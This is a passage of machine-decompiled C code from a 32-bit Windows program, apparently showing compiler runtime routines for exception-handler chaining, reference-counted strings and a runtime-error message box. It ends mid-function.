// Address range: 0x402b75 - 0x402b76
int32_t function_402b75(void) {
    // 0x402b75
    int32_t result; // 0x402b75
    return result;
}

// Address range: 0x402b77 - 0x402ba0
int32_t function_402b77(void) {
    int32_t v1 = __readfsdword(0); // 0x402b8a
    __writefsdword(0, (int32_t)&v1);
    int32_t result; // 0x402b77
    return result;
}

// Address range: 0x402ba0 - 0x402ba5
int32_t function_402ba0(void) {
    int32_t result = function_402cdf((int32_t)&g118, (int32_t)&g118, (int32_t)&g118); // 0x402ba0
    return result;
}

// Address range: 0x402ba5 - 0x402bc4
int32_t function_402ba5(int32_t a1) {
    // 0x402ba5
    if (*(int32_t *)(a1 + 12) != 0) {
        // 0x402bb0
        function_402bc7();
    }
    // 0x402bbe
    return function_402e43((int32_t)&g118);
}

// Address range: 0x402bc7 - 0x402bcd
int32_t function_402bc7(void) {
    // 0x402bc7
    int32_t result; // 0x402bc7
    return result;
}

// Address range: 0x402bcf - 0x402bdd
int32_t function_402bcf(void) {
    // 0x402bcf
    int32_t result; // 0x402bcf
    return result;
}

// Address range: 0x402bdf - 0x402bee
int32_t function_402bdf(void) {
    // 0x402bdf
    int32_t result; // 0x402bdf
    return result;
}

// Address range: 0x402bef - 0x402c0a
int32_t function_402bef(void) {
    // 0x402bef
    int32_t result; // 0x402bef
    return result;
}

// Address range: 0x402c0b - 0x402c2c
int32_t function_402c0b(void) {
    // 0x402c0b
    int32_t v1; // 0x402c0b
    return g15 == 0 ? v1 : 2;
}

// Address range: 0x402c2f - 0x402c44
int32_t function_402c2f(int32_t a1, int32_t a2) {
    // 0x402c2f
    return 0;
}

// Address range: 0x402c47 - 0x402c58
int32_t function_402c47(int32_t a1) {
    // 0x402c47
    int32_t result; // 0x402c47
    if ((unsigned char)g15 < 2) {
        // 0x402c57
        return result;
    }
    // 0x402c50
    int32_t v1; // 0x402c47
    return function_402c2f(result, v1);
}

// Address range: 0x402c5b - 0x402c79
int32_t function_402c5b(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402c5b
    int32_t result; // 0x402c5b
    int32_t v1; // 0x402c5b
    if (v1 == 0) {
        // 0x402c78
        return result;
    }
    char v2 = v1;
    int32_t v3 = *(int32_t *)(v1 + 1); // 0x402c5f
    result = v3;
    if (v2 != -23 && v2 == -21) {
        // 0x402c6c
        result = 0x1000000 * v3 / 0x1000000;
    }
    // 0x402c78
    return result;
}

// Address range: 0x402c7b - 0x402ca2
int32_t function_402c7b(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x402c7b
    int32_t result; // 0x402c7b
    if ((unsigned char)g15 >= 2) {
        // 0x402c84
        int32_t v1; // 0x402c7b
        int32_t v2; // 0x402c7b
        int32_t v3; // 0x402c7b
        function_402c5b(v3, v1, v2);
        int32_t v4; // bp-16, 0x402c7b
        result = &v4;
    }
    // 0x402ca1
    return result;
}

// Address range: 0x402ca3 - 0x402cbf
int32_t function_402ca3(void) {
    // 0x402ca3
    int32_t result; // 0x402ca3
    return result;
}

// Address range: 0x402cbf - 0x402cdd
int32_t function_402cbf(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402cbf
    int32_t v1; // bp-8, 0x402cbf
    int32_t * v2 = &v1; // 0x402cc8
    if ((unsigned char)g15 >= 2) {
        int32_t v3 = 0xeedfae3; // bp-24, 0x402ccf
        v2 = &v3;
    }
    // 0x402cda
    return *(int32_t *)((int32_t)v2 + 4);
}

// Address range: 0x402cdf - 0x402e09
int32_t function_402cdf(int32_t a1, int32_t a2, int32_t a3) {
    // 0x402cdf
    if ((*(int32_t *)(a2 + 4) & 6) != 0) {
        // 0x402e03
        return 1;
    }
    int32_t v1 = *(int32_t *)a2; // 0x402cf0
    int32_t v2 = *(int32_t *)(a2 + 24); // 0x402cfc
    int32_t v3; // 0x402cdf
    if (v1 == 0xeedfade) {
        goto lab_0x402d6c;
    } else {
        // 0x402cfe
        if (a2 == 0 || g41 == 0) {
            // 0x402e03
            return 1;
        }
        // 0x402d1c
        v2 = a2;
        if (v1 == 0xeefface) {
            goto lab_0x402d6c;
        } else {
            int32_t v4 = function_402c0b(); // 0x402d2c
            v2 = v4;
            if (g16 != 0 == g15 == 0) {
                // 0x402d43
                v3 = a3;
                if (v4 == 0) {
                    // 0x402e03
                    return 1;
                }
                goto lab_0x402d93;
            } else {
                goto lab_0x402d6c;
            }
        }
    }
  lab_0x402d6c:
    // 0x402d6c
    v3 = g16 > 1 == g15 == 0 ? v2 : a2;
    goto lab_0x402d93;
  lab_0x402d93:;
    int32_t * v5 = (int32_t *)(v3 + 4); // 0x402d93
    *v5 = *v5 | 2;
    __readfsdword(0);
    int32_t * v6 = (int32_t *)function_4042f7(); // 0x402dc0
    int32_t v7 = *v6; // bp-56, 0x402dc0
    *v6 = (int32_t)&v7;
    int32_t v8; // 0x402cdf
    *(int32_t *)(v8 + 4) = 0x402de3;
    return function_402c47(v7);
}

// Address range: 0x402e0b - 0x402e41
int32_t function_402e0b(int32_t a1, int32_t a2) {
    // 0x402e0b
    if ((*(int32_t *)(a2 + 4) & 6) != 0) {
        // 0x402e1c
        *(int32_t *)(a1 + 4) = 0x402e3b;
        int32_t v1; // 0x402e0b
        int32_t v2; // 0x402e0b
        int32_t v3; // 0x402e0b
        int32_t v4; // 0x402e0b
        function_402c7b(v4, v2, v1, v3);
    }
    // 0x402e3b
    return 1;
}

// Address range: 0x402e43 - 0x402e94
int32_t function_402e43(int32_t a1) {
    // 0x402e43
    *(int32_t *)(a1 + 4) = 0x402e8e;
    int32_t * v1 = (int32_t *)function_4042f7(); // 0x402e53
    int32_t v2 = *v1; // 0x402e53
    *v1 = *(int32_t *)v2;
    int32_t v3 = *(int32_t *)(v2 + 12); // 0x402e61
    int32_t * v4 = (int32_t *)(v3 + 4); // 0x402e64
    *v4 = *v4 & -3;
    if (*(int32_t *)v3 != 0xeedfade) {
        // 0x402e70
        function_402bef();
    }
    // 0x402e7d
    int32_t v5; // 0x402e43
    *(int32_t *)v5 = *(int32_t *)__readfsdword(0);
    return 1;
}

// Address range: 0x402e97 - 0x402ec6
int32_t function_402e97(int32_t a1) {
    int32_t * v1 = (int32_t *)function_4042f7(); // 0x402e9c
    *v1 = *(int32_t *)*v1;
    __writefsdword(0, *(int32_t *)a1);
    return function_402ca3();
}

// Address range: 0x402ec6 - 0x402ec7
int32_t function_402ec6(void) {
    // 0x402ec6
    int32_t result; // 0x402ec6
    return result;
}

// Address range: 0x402ec7 - 0x402edc
int32_t function_402ec7(int32_t a1, int32_t result) {
    // 0x402ec7
    __writefsdword(0, result);
    return result;
}

// Address range: 0x402edc - 0x402edd
int32_t function_402edc(void) {
    // 0x402edc
    int32_t result; // 0x402edc
    return result;
}

// Address range: 0x402edf - 0x402f7b
int32_t function_402edf(int32_t a1) {
    // 0x402edf
    function_4025cf();
    // UNREACHABLE
}

// Address range: 0x402f7b - 0x402f7f
int32_t function_402f7b(int32_t a1) {
    // 0x402f7b
    int32_t result; // 0x402f7b
    return result;
}

// Address range: 0x402f7f - 0x40301c
int32_t function_402f7f(int32_t a1, int32_t a2) {
    // 0x402f7f
    if ((*(int32_t *)(a1 + 4) & 6) != 0) {
        // 0x403019
        return 0;
    }
    // 0x402f90
    if (g41 == 0) {
        function_402edf((int32_t)&g118);
        // UNREACHABLE
    }
    // 0x402ff4
    function_402cbf(0, a2, a1);
    function_4033eb((int32_t)&g41);
    // UNREACHABLE
}

// Address range: 0x40301f - 0x40303c
int32_t function_40301f(void) {
    // 0x40301f
    int32_t v1; // 0x40301f
    int32_t result = v1 - 12; // 0x403021
    int32_t v2 = __readfsdword(0); // 0x403024
    __writefsdword(0, result);
    *(int32_t *)result = v2;
    *(int32_t *)(v1 - 8) = 0x402f7f;
    g76 = result;
    return result;
}

// Address range: 0x40303f - 0x403067
int32_t function_40303f(void) {
    // 0x40303f
    if (g76 == 0) {
        // 0x403066
        return 0;
    }
    int32_t v1 = __readfsdword(0); // 0x40304a
    int32_t v2 = v1; // 0x40304f
    if (g76 == v1) {
        int32_t result = *(int32_t *)g76; // 0x403051
        __writefsdword(0, result);
        return result;
    }
    int32_t result2 = g76; // 0x40305c
    while (v2 != -1) {
        int32_t * v3 = (int32_t *)v2;
        v2 = *v3;
        if (v2 == g76) {
            // 0x403062
            result2 = *(int32_t *)g76;
            *v3 = result2;
            return result2;
        }
        result2 = g76;
    }
  lab_0x403066:
    // 0x403066
    return result2;
}

// Address range: 0x403067 - 0x4030c6
int32_t function_403067(void) {
    // 0x403067
    if (g77 == 0) {
        // 0x4030c1
        return 0;
    }
    int32_t v1 = __readfsdword(0); // bp-28, 0x403087
    __writefsdword(0, (int32_t)&v1);
    int32_t v2 = g78; // 0x40308f
    if (g78 < 1) {
        // 0x4030a3
        __writefsdword(0, v1);
        // 0x4030c1
        return 0;
    }
    v2--;
    while (v2 >= 0 == (v2 != 0)) {
        // 0x403091
        v2--;
    }
    // 0x4030a3
    g78 = v2;
    // 0x4030a3
    __writefsdword(0, v1);
    // 0x4030c1
    return 0;
}

// Address range: 0x4030c7 - 0x403126
int32_t function_4030c7(int32_t a1) {
    // 0x4030c7
    if (g77 == 0) {
        // 0x403121
        return 0;
    }
    uint32_t v1 = *(int32_t *)g77; // 0x4030d6
    int32_t v2 = __readfsdword(0); // bp-28, 0x4030e5
    __writefsdword(0, (int32_t)&v2);
    if (v1 >= 1) {
        // 0x4030ef
        g78 = v1;
    }
    // 0x403103
    __writefsdword(0, v2);
    // 0x403121
    return 0;
}

// Address range: 0x403127 - 0x4031ee
int32_t function_403127(int32_t a1) {
    // 0x403127
    int32_t v1; // 0x403127
    char * v2 = (char *)(v1 - 60); // 0x403137
    __asm_rep_movsd_memcpy(v2, (char *)&g75, 11);
    g75 = v2;
    int32_t * v3 = (int32_t *)(v1 + 12); // 0x403167
    int32_t v4; // 0x403127
    g78 = *v3 != 0 ? 0 : v4;
    g42 = 0x4010ef;
    g43 = 0x4010f7;
    function_40301f();
    g80 = (char)*v3 + 1;
    if (g44 == 0) {
        // 0x4031cf
        *(char *)&g46 = 1;
    }
    // 0x4031dc
    if (*v3 == 1) {
        // 0x4031e6
        int32_t v5; // 0x403127
        return function_4030c7(v5);
    }
    function_403307();
    // UNREACHABLE
}

// Address range: 0x4031ee - 0x4031ef
int32_t function_4031ee(void) {
    // 0x4031ee
    int32_t result; // 0x4031ee
    return result;
}

// Address range: 0x4031ef - 0x403249
int32_t function_4031ef(void) {
    int32_t v1 = 16; // 0x4031f9
    int32_t v2 = g8;
    int64_t v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2; // 0x403207
    *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
    int32_t v4 = v3 / 10; // 0x40321b
    v1--;
    while (v4 != 0) {
        // 0x4031ff
        v2 = v4;
        v3 = 0x100000000 * (int64_t)(v2 >> 31) | (int64_t)v2;
        *(char *)((v1 & 255) + (int32_t)"Runtime error     at 00000000") = (char)(v3 % 10) + 48;
        v4 = v3 / 10;
        v1--;
    }
    int32_t v5 = 28; // 0x403226
    uint32_t v6 = g9;
    char v7 = *(char *)((v6 & 15) + (int32_t)&g20); // 0x403230
    *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
    int32_t result = v6 / 16; // 0x40323d
    v5--;
    while (v6 >= 16) {
        // 0x40322b
        v6 = result;
        v7 = *(char *)((v6 & 15) + (int32_t)&g20);
        *(char *)((v5 & 255) + (int32_t)"Runtime error     at 00000000") = v7;
        result = v6 / 16;
        v5--;
    }
    // 0x403245
    return result;
}

// Address range: 0x40324b - 0x403278
int32_t function_40324b(void) {
    int32_t v1 = g8; // 0x40324d
    g8 = 0;
    __asm_rep_movsd_memcpy((char *)&g75, g75, 11);
    return v1 == 0;
}

// Address range: 0x403278 - 0x403279
int32_t function_403278(void) {
    // 0x403278
    int32_t result; // 0x403278
    return result;
}

// Address range: 0x40327b - 0x4032fa
int32_t function_40327b(void) {
    // 0x40327b
    if (g50 != 0) {
        // 0x403285
        int32_t v1; // bp-28, 0x40327b
        return &v1;
    }
    // 0x4032dc
    int32_t result; // 0x40327b
    if (g17 == 0) {
        // 0x4032e5
        int32_t hWnd; // 0x40327b
        result = MessageBoxA((int32_t *)hWnd, NULL, "Error", (int32_t)"Runtime error     at 00000000");
    }
    // 0x4032f8
    return result;
}

// Address range: 0x403307 - 0x4033da
int32_t function_403307(void) {
    // 0x403307
    if (g80 == 0 && g49 != 0) {
        // 0x403325
        g49 = 0;
    }
    // 0x403336
    if (g9 != 0) {
        // 0x40333f
        function_4031ef();
        function_40327b();
        g9 = 0;
    }
    // 0x403350
    int32_t v1; // bp-16, 0x403307
    int32_t v2 = &v1;
    int32_t v3 = &g8; // 0x4033d4
    int32_t v4; // 0x403307
    int32_t v5; // 0x403307
    int32_t v6; // 0x403307
    while (true) {
      lab_0x403350:
        // 0x403350
        v4 = v3;
        v5 = v2;
        if (g80 == 2) {
            // 0x403356
            if (*(int32_t *)v4 == 0) {
                // 0x40335b
                g78 = 0;
            }
        }
        // 0x403360
        function_403067();
        if (g80 < 2) {
            goto lab_0x403370;
        } else {
            // 0x40336b
            v6 = v5;
            if (*(int32_t *)v4 == 0) {
                goto lab_0x403391;
            } else {
                goto lab_0x403370;
            }
        }
    }
  lab_0x4033af:
    // 0x4033af
    *(int32_t *)(v2 - 4) = *(int32_t *)v4;
    function_40110f();
    // UNREACHABLE
  lab_0x403370:
    // 0x403370
    v6 = v5;
    if (g79 != 0) {
        // 0x403377
        function_403fa7();
        int32_t v7 = *(int32_t *)(g79 + 16); // 0x40337f
        v6 = v5;
        if (!((v7 == 0 | v7 == *(int32_t *)(g79 + 4)))) {
            int32_t v8 = v5 - 4; // 0x40338b
            *(int32_t *)v8 = v7;
            FreeLibrary(&g118);
            v6 = v8;
        }
    }
    goto lab_0x403391;
  lab_0x403391:
    // 0x403391
    v2 = v6;
    function_40303f();
    if (g80 != 0) {
        // 0x4033a5
        function_40324b();
    }
    // 0x4033aa
    if (g75 == NULL) {
        // break -> 0x4033af
        goto lab_0x4033af;
    }
    int32_t * v9 = (int32_t *)(v2 - 4); // 0x4033c8
    *v9 = v4;
    __asm_rep_movsd_memcpy((char *)&g75, g75, 11);
    v3 = *v9;
    goto lab_0x403350;
}

// Address range: 0x4033da - 0x4033df
int32_t function_4033da(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x4033da
    int32_t result; // 0x4033da
    return result;
}

// Address range: 0x4033df - 0x4033e9
int32_t function_4033df(void) {
    // 0x4033df
    function_403307();
    // UNREACHABLE
}

// Address range: 0x4033e9 - 0x4033ea
int32_t function_4033e9(void) {
    // 0x4033e9
    int32_t result; // 0x4033e9
    return result;
}

// Address range: 0x4033eb - 0x4033f6
int32_t function_4033eb(int32_t a1) {
    // 0x4033eb
    g9 = a1;
    return function_4033df();
}

// Address range: 0x4033f6 - 0x4033f7
int32_t function_4033f6(void) {
    // 0x4033f6
    int32_t result; // 0x4033f6
    return result;
}

// Address range: 0x4033f7 - 0x40341a
int32_t function_4033f7(void) {
    // 0x4033f7
    int32_t result; // 0x4033f7
    if (result == 0) {
        // 0x403419
        return result;
    }
    // 0x4033fd
    *(int32_t *)result = 0;
    int32_t * v1 = (int32_t *)(result - 8); // 0x403403
    int32_t v2 = *v1; // 0x403403
    if (v2 < 1) {
        // 0x403419
        return result;
    }
    int32_t v3 = v2 - 1; // 0x403409
    *v1 = v3;
    if (v3 == 0) {
        // 0x40340f
        function_40255f();
    }
    // 0x403419
    return result;
}

// Address range: 0x40341b - 0x40344a
int32_t function_40341b(void) {
    int32_t v1; // 0x40341b
    int32_t * v2 = (int32_t *)v1; // 0x403421
    int32_t v3 = *v2; // 0x403421
    int32_t v4; // 0x40341b
    int32_t v5 = v4; // 0x403425
    int32_t * v6; // 0x40342d
    uint32_t v7; // 0x40342d
    int32_t v8; // 0x403433
    if (v3 != 0) {
        // 0x403427
        *v2 = 0;
        v6 = (int32_t *)(v3 - 8);
        v7 = *v6;
        v5 = v4;
        if (v7 >= 1) {
            // 0x403433
            v8 = v7 - 1;
            *v6 = v8;
            v5 = v4;
            if (v8 == 0) {
                // 0x403439
                v5 = function_40255f();
            }
        }
    }
    int32_t result = v5;
    int32_t v9; // 0x40341b
    int32_t v10 = v9 - 1; // 0x403444
    v1 += 4;
    while (v10 != 0) {
        int32_t v11 = result;
        v2 = (int32_t *)v1;
        v3 = *v2;
        v5 = v11;
        if (v3 != 0) {
            // 0x403427
            *v2 = 0;
            v6 = (int32_t *)(v3 - 8);
            v7 = *v6;
            v5 = v11;
            if (v7 >= 1) {
                // 0x403433
                v8 = v7 - 1;
                *v6 = v8;
                v5 = v11;
                if (v8 == 0) {
                    // 0x403439
                    v5 = function_40255f();
                }
            }
        }
        // 0x403441
        result = v5;
        v10--;
        v1 += 4;
    }
    // 0x403447
    return result;
}

// Address range: 0x40344b - 0x40348e
int32_t function_40344b(void) {
    int32_t v1 = 0; // 0x40344d
    int32_t v2; // 0x40344b
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)(v2 - 8); // 0x40344f
        int32_t v4 = *v3; // 0x40344f
        int32_t v5 = v4 + 1; // 0x403452
        if (v5 < 0 == (v5 & (v4 ^ -0x80000000)) < 0 == (v5 != 0)) {
            // 0x40346f
            *v3 = v5;
        } else {
            // 0x403455
            v1 = function_40348f();
            function_402643();
        }
    }
    // 0x403473
    int32_t v6; // 0x40344b
    *(int32_t *)v6 = v1;
    int32_t result = 0; // 0x403477
    if (v6 == 0) {
        // 0x40348d
        return result;
    }
    int32_t * v7 = (int32_t *)(v6 - 8); // 0x403479
    int32_t v8 = *v7; // 0x403479
    if (v8 < 1) {
        // 0x40348d
        return result;
    }
    int32_t v9 = v8 - 1; // 0x40347f
    *v7 = v9;
    if (v9 == 0) {
        // 0x403485
        result = function_40255f();
    }
    // 0x40348d
    return result;
}

// Address range: 0x40348f - 0x4034ba
int32_t function_40348f(void) {
    // 0x40348f
    int32_t v1; // 0x40348f
    if (v1 < 1) {
        // 0x4034b7
        return 0;
    }
    int32_t v2 = function_40253f(); // 0x40349b
    *(int16_t *)(v2 + (v1 + 8 & -2)) = 0;
    *(int32_t *)v2 = 1;
    return v2 + 8;
}

// Address range: 0x4034bb - 0x4034e9
int32_t function_4034bb(void) {
    int32_t v1 = function_40348f(); // 0x4034c6
    int32_t v2; // 0x4034bb
    if (v2 != 0) {
        // 0x4034d3
        function_402643();
    }
    int32_t result = function_4033f7(); // 0x4034de
    int32_t v3; // 0x4034bb
    *(int32_t *)v3 = v1;
    return result;
}

// Address range: 0x4034eb - 0x4034fa
int32_t function_4034eb(void) {
    // 0x4034eb
    return function_4034bb();
}

// Address range: 0x4034fb - 0x403527
int32_t function_4034fb(void) {
    // 0x4034fb
    int32_t v1; // 0x4034fb
    if (v1 == 0 || *(char *)v1 == 0) {
        // 0x403522
        return function_4034bb();
    }
    int32_t v2; // 0x4034fb
    while (*(char *)(v2 + 1) != 0) {
        // 0x40350b
        if (*(char *)(v2 + 2) == 0) {
            // break -> 0x403522
            break;
        }
        // 0x403510
        if (*(char *)(v2 + 3) == 0) {
            // break -> 0x403522
            break;
        }
        int32_t v3 = v2 + 4; // 0x403515
        v2 = v3;
        if (*(char *)v3 == 0) {
            // break -> 0x403522
            break;
        }
    }
    // 0x403522
    return function_4034bb();
}

// Address range: 0x403527 - 0x403528
int32_t function_403527(void) {
    // 0x403527
    int32_t result; // 0x403527
    return result;
}

// Address range: 0x40352b - 0x403535
int32_t function_40352b(void) {
    // 0x40352b
    return function_4034bb();
}

// Address range: 0x403535 - 0x403536
int32_t function_403535(void) {
    // 0x403535
    int32_t result; // 0x403535
    return result;
}

// Address range: 0x403537 - 0x40354e
int32_t function_403537(void) {
    // 0x403537
    return function_4034bb();
}

// Address range: 0x40354e - 0x40354f
int32_t function_40354e(void) {
    // 0x40354e
    int32_t result; // 0x40354e
    return result;
}

// Address range: 0x40354f - 0x403557
int32_t function_40354f(void) {
    int32_t result = 0; // 0x403551
    int32_t v1; // 0x40354f
    if (v1 != 0) {
        // 0x403553
        result = *(int32_t *)(v1 - 4);
    }
    // 0x403556
    return result;
}

// Address range: 0x403557 - 0x40359b
int32_t function_403557(void) {
    // 0x403557
    int32_t v1; // 0x403557
    int32_t result; // 0x403557
    if (v1 == 0) {
        // 0x40359a
        return result;
    }
    if (result == 0) {
        function_40344b();
    }
    // 0x403565
    function_4038db();
    return function_402643();
}

// Address range: 0x40359b - 0x40360e
int32_t function_40359b(void) {
    // 0x40359b
    int32_t v1; // 0x40359b
    if (v1 == 0) {
        // 0x403600
        return function_40344b();
    }
    int32_t v2; // 0x40359b
    int32_t v3; // 0x40359b
    if (v3 == 0) {
        v2 = function_40344b();
    }
    // 0x4035a7
    if (v1 == v2) {
        // 0x403607
        return function_403557();
    }
    if (v3 != v2) {
        // 0x4035af
        function_40344b();
        return function_403557();
    }
    int32_t v4 = function_40348f(); // 0x4035cb
    function_402643();
    function_402643();
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)(v4 - 8); // 0x4035f4
        *v5 = *v5 - 1;
    }
    // 0x4035f7
    return function_40344b();
}

// Address range: 0x40360e - 0x40360f
int32_t function_40360e(void) {
    // 0x40360e
    int32_t result; // 0x40360e
    return result;
}

// Address range: 0x40360f - 0x403698
int32_t function_40360f(int32_t result) {
    // 0x40360f
    int32_t v1; // bp-20, 0x40360f
    int32_t v2 = (int32_t)&v1 + 20; // 0x403618
    int32_t v3; // 0x40360f
    int32_t v4 = *(int32_t *)(v2 + 4 * v3); // 0x403618
    int32_t v5; // 0x40360f
    int32_t v6 = v3 + (int32_t)!((v4 == 0 | v5 != v4)); // 0x40363f
    int32_t v7 = v4 == 0 | v5 != v4 ? 0 : v4;
    int32_t v8 = *(int32_t *)(4 * v6 + v2); // 0x40362e
    int32_t v9 = v7; // 0x403634
    if (v8 != 0) {
        // 0x403636
        v9 = v7 != v8 ? v7 : 0;
    }
    int32_t v10 = v9;
    v6--;
    while (v6 != 0) {
        // 0x40362e
        v7 = v10;
        v8 = *(int32_t *)(4 * v6 + v2);
        v9 = v7;
        if (v8 != 0) {
            // 0x403636
            v9 = v7 != v8 ? v7 : 0;
        }
        // 0x40363f
        v10 = v9;
        v6--;
    }
    int32_t v11; // 0x40360f
    int32_t v12; // 0x40360f
    int32_t v13; // bp-24, 0x40360f
    if (v10 == 0) {
        // 0x40365d
        v13 = function_40348f();
        v12 = 0;
    } else {
        // 0x403646
        v13 = function_4038db();
        v11 = v3 - 1;
        v12 = v1;
    }
    int32_t v14 = v11; // 0x403679
    if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
        // 0x40366f
        function_402643();
    }
    // 0x403679
    v14--;
    while (v14 != 0) {
        // 0x403665
        if (*(int32_t *)((int32_t)&v13 + 24 + 4 * v14) != 0) {
            // 0x40366f
            function_402643();
        }
        // 0x403679
        v14--;
    }
    if (v12 != 0) {
        // 0x40368e
        return result;
    }
    // 0x403682
    if (v13 != 0) {
        int32_t * v15 = (int32_t *)(v13 - 8); // 0x403686
        *v15 = *v15 - 1;
    }
    // 0x403689
    function_40344b();
    // 0x40368e
    return result;
}

// Address range: 0x403698 - 0x403699
int32_t function_403698(void) {
    // 0x403698
    int32_t result; // 0x403698
    return result;
}

// Address range: 0x40369b - 0x40373d
int32_t function_40369b(void) {
    // 0x40369b
    int32_t v1; // 0x40369b
    int32_t v2; // 0x40369b
    if (v2 == v1) {
        // 0x403724
        int32_t result; // 0x40369b
        return result;
    }
    if (v2 == 0) {
        // 0x403724
        return -*(int32_t *)(v1 - 4);
    }
    uint32_t result2 = *(int32_t *)(v2 - 4);
    if (v1 == 0) {
        // 0x403724
        return result2;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x4036b5
    int32_t result3 = result2 - v3; // 0x4036b8
    uint32_t v4 = result2 < v3 | result3 == 0 ? result2 : v3;
    int32_t v5 = v4 / 4; // 0x4036c2
    int32_t v6; // 0x40369b
    int32_t v7; // 0x40369b
    if (v4 < 4) {
        goto lab_0x4036ea;
      lab_0x4036ea:;
        int32_t v8 = v4 & 3; // 0x4036eb
        if (v8 == 0) {
            // 0x403724
            return 2 * result3;
        }
        uint32_t v9 = *(int32_t *)v7; // 0x4036f0
        uint32_t v10 = *(int32_t *)v6; // 0x4036f2
        if ((char)v9 != (char)v10) {
            // 0x403724
            return result3;
        }
        int32_t v11 = v8 - 1; // 0x4036f8
        if (v11 == 0) {
            // 0x403724
            return 2 * result3;
        }
        // 0x4036fb
        if ((char)(v9 / 256) != (char)(v10 / 256)) {
            // 0x403724
            return result3;
        }
        if (v11 == 1) {
            // 0x403724
            return 2 * result3;
        }
        // 0x403702
        if (((v10 ^ v9) & 0xff0000) != 0) {
            // 0x403724
            return result3;
        }
        // 0x403724
        return 2 * result3;
    }
    int32_t v12; // 0x40369b
    int32_t v13 = v12;
    int32_t v14; // 0x40369b
    while (*(int32_t *)v14 == *(int32_t *)v13) {
        int32_t v15 = v14 + 4;
        if (v5 == 1) {
            // 0x4036e4
            v7 = v15;
            v6 = v13 + 4;
            goto lab_0x4036ea;
        }
        // 0x4036cf
        if (*(int32_t *)v15 != *(int32_t *)(v13 + 4)) {
            // break -> 0x403724
            break;
        }
        int32_t v16 = v14 + 8; // 0x4036d9
        int32_t v17 = v13 + 8; // 0x4036dc
        v5 -= 2;
        v14 = v16;
        v7 = v16;
        v6 = v17;
        if (v5 == 0) {
            goto lab_0x4036ea;
        }
        v13 = v17;
    }
    // 0x403724
    return result3;
}

// Address range: 0x40373f - 0x40374e
int32_t function_40373f(void) {
    // 0x40373f
    int32_t result; // 0x40373f
    if (result == 0) {
        // 0x40374d
        return result;
    }
    int32_t * v1 = (int32_t *)(result - 8); // 0x403743
    uint32_t v2 = *v1 + 1; // 0x403746
    if (v2 >= 1) {
        // 0x403749
        *v1 = v2;
    }
    // 0x40374d
    return result;
}

// Address range: 0x40374f - 0x40375b
int32_t function_40374f(void) {
    // 0x40374f
    int32_t v1; // 0x40374f
    return v1 == 0 ? 0x403754 : v1;
}

// Address range: 0x40375b - 0x40379c
int32_t function_40375b(void) {
    // 0x40375b
    int32_t v1; // 0x40375b
    if (v1 == 0 || *(int32_t *)(v1 - 8) == 1) {
        // 0x403799
        return 0;
    }
    int32_t result = function_40348f(); // 0x40376d
    *(int32_t *)v1 = result;
    function_402643();
    int32_t * v2 = (int32_t *)(result - 8); // 0x403782
    int32_t v3 = *v2; // 0x403782
    if (v3 < 1) {
        // 0x403799
        return result;
    }
    int32_t v4 = v3 - 1; // 0x403788
    *v2 = v4;
    int32_t result2 = result; // 0x40378c
    if (v4 == 0) {
        // 0x40378e
        result2 = function_40255f();
    }
    // 0x403799
    return result2;
}

// Address range: 0x40379f - 0x4037a4
int32_t function_40379f(int32_t a1, int32_t a2, int32_t a3) {
    // 0x40379f
    return function_40375b();
}

// Address range: 0x4037a4 - 0x4037a5
int32_t function_4037a4(void) {
    // 0x4037a4
    int32_t result; // 0x4037a4
    return result;
}

// Address range: 0x4037a7 - 0x4037ac
int32_t function_4037a7(void) {
    // 0x4037a7
    return function_40375b();
}

// Address range: 0x4037ac - 0x4037ad
int32_t function_4037ac(void) {
    // 0x4037ac
    int32_t result; // 0x4037ac
    return result;
}

// Address range: 0x4037af - 0x4037ee
int32_t function_4037af(int32_t * a1) {
    // 0x4037af
    int32_t v1; // 0x4037af
    if (v1 == 0) {
        // 0x4037ea
        return function_4033f7();
    }
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x4037b4
    if (v2 == 0) {
        // 0x4037ea
        return function_4033f7();
    }
    int32_t v3; // 0x4037af
    int32_t v4; // 0x4037af
    if (v3 < 1) {
        if (v4 < 0) {
            // 0x4037ea
            return function_4033f7();
        }
        // 0x4037ea
        return function_4034bb();
    }
    if (v4 < 0 || v3 - 1 >= v2) {
        // 0x4037ea
        return function_4033f7();
    }
    // 0x4037ea
    return function_4034bb();
}

// Address range: 0x4037ee - 0x4037ef
int32_t function_4037ee(void) {
    // 0x4037ee
    int32_t result; // 0x4037ee
    return result;
}

// Address range: 0x4037ef - 0x403837
int32_t function_4037ef(void) {
    // 0x4037ef
    int32_t v1; // 0x4037ef
    int32_t v2; // 0x4037ef
    int32_t v3; // 0x4037ef
    int32_t result = function_40379f(v3, v2, v1); // 0x4037f8
    if (result == 0) {
        // 0x403833
        return 0;
    }
    // 0x403803
    int32_t v4; // 0x4037ef
    if (v4 < 1) {
        // 0x403833
        return result;
    }
    int32_t result2 = result; // 0x40380b
    int32_t v5; // 0x4037ef
    if (!((v5 < 1 | *(int32_t *)(result - 4) <= v4 - 1))) {
        // 0x403811
        function_402643();
        result2 = function_4038db();
    }
    // 0x403833
    return result2;
}

// Address range: 0x403837 - 0x403892
int32_t function_403837(void) {
    int32_t result = 0; // 0x403839
    int32_t v1; // 0x403837
    if (v1 != 0) {
        // 0x40383b
        function_4038db();
        function_402643();
        result = function_402643();
    }
    // 0x403891
    return result;
}

// Address range: 0x403893 - 0x4038d8
int32_t function_403893(void) {
    // 0x403893
    int32_t v1; // 0x403893
    int32_t v2; // 0x403893
    if (v1 == 0 || v2 == 0) {
        // 0x4038cc
        return 0;
    }
    uint32_t v3 = *(int32_t *)(v1 - 4); // 0x4038a2
    int32_t v4 = *(int32_t *)(v2 - 4) - 1; // 0x4038a9
    if (v4 < 0 || v3 <= v4) {
        // 0x4038cc
        return 0;
    }
    // 0x4038b3
    int32_t v5; // bp-16, 0x403893
    int32_t v6 = &v5; // 0x4038a5
    int32_t v7 = v3 - v4; // 0x4038af
    bool v8; // 0x403893
    int32_t v9 = v8 ? -1 : 1;
